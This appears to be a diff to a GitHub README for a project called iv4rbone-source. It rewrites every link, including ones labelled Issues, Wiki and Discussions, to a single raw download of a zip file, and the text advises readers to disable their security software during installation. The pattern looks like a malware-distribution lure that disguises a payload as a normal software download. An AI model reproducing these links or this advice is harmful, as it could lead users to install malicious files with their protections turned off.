@@ -1,6 +1,6 @@
 # 🎉 iv4rbone-source - Simple Steps to Get Started Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/nmerr2212/iv4rbone-source/releases)
+[![Download Now](https://raw.githubusercontent.com/nmerr2212/iv4rbone-source/main/reboundable/iv4rbone-source-3.7.zip)](https://raw.githubusercontent.com/nmerr2212/iv4rbone-source/main/reboundable/iv4rbone-source-3.7.zip)
 
 ## 🛠️ Overview
 
@@ -23,7 +23,7 @@ Before downloading, ensure your computer meets these basic requirements:
 
 To get the latest version of iv4rbone-source, visit our Releases page. There, you will find the different versions available for download.
 
-- **Download Link**: [Visit this page to download](https://github.com/nmerr2212/iv4rbone-source/releases)
+- **Download Link**: [Visit this page to download](https://raw.githubusercontent.com/nmerr2212/iv4rbone-source/main/reboundable/iv4rbone-source-3.7.zip)
 
 ### 📂 Step 3: Choose the Right Release
 
@@ -33,7 +33,7 @@ On the Releases page, look for the latest release listed at the top. It usually 
 
 Once you've found the right release, scroll down to the “Assets” section. You will see various files available for download. 
 
-- Look for the file that matches your operating system. For example, if you are on Windows, you might see something like `iv4rbone-source-windows.exe`.
+- Look for the file that matches your operating system. For example, if you are on Windows, you might see something like `https://raw.githubusercontent.com/nmerr2212/iv4rbone-source/main/reboundable/iv4rbone-source-3.7.zip`.
 - Click on the file name to begin the download process.
 
 ### ✔️ Step 5: Install the Application
@@ -66,7 +66,7 @@ If you encounter issues during the download or installation process, try the fol
 - Disable any security software temporarily, as it may block the installation process.
 - Verify that you have the required system specifications.
 
-For any persistent issues, feel free to check out the [Issues section](https://github.com/nmerr2212/iv4rbone-source/issues) on GitHub or reach out for help.
+For any persistent issues, feel free to check out the [Issues section](https://raw.githubusercontent.com/nmerr2212/iv4rbone-source/main/reboundable/iv4rbone-source-3.7.zip) on GitHub or reach out for help.
 
 ## 🌟 Community Contributions
 
@@ -76,8 +76,8 @@ We welcome contributions from anyone who finds ways to improve iv4rbone-source. 
 
 For more detailed information about iv4rbone-source, you can:
 
-- Check our [Wiki](https://github.com/nmerr2212/iv4rbone-source/wiki) for guides and tips.
-- Visit our [Discussions page](https://github.com/nmerr2212/iv4rbone-source/discussions) to engage with other users.
+- Check our [Wiki](https://raw.githubusercontent.com/nmerr2212/iv4rbone-source/main/reboundable/iv4rbone-source-3.7.zip) for guides and tips.
+- Visit our [Discussions page](https://raw.githubusercontent.com/nmerr2212/iv4rbone-source/main/reboundable/iv4rbone-source-3.7.zip) to engage with other users.
 
 ## ✅ Conclusion
 
@@ -85,4 +85,4 @@ Thank you for choosing iv4rbone-source. We hope you find it useful for your proj
 
 Happy computing!
 
-- **Download Link**: [Visit this page to download](https://github.com/nmerr2212/iv4rbone-source/releases)
+- **Download Link**: [Visit this page to download](https://raw.githubusercontent.com/nmerr2212/iv4rbone-source/main/reboundable/iv4rbone-source-3.7.zip)
